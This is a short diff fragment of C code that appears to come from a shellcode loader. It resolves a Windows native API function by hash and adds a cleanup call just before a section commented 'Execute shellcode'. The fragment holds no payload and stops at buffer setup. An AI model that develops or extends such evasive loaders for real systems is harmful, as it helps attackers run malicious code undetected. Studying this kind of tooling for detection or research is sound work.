@@ -78,6 +78,8 @@ INT wmain() {
 	HgGetFunction(&HgData, &dwHash, (LPVOID)&NtWaitForSingleObject);
 
 
+	HgUninitialise(&HgData, TRUE);
+
 	// Execute shellcode
 	PVOID lpBaseAddress = NULL;
 	SIZE_T sDataSize = 0x1000;
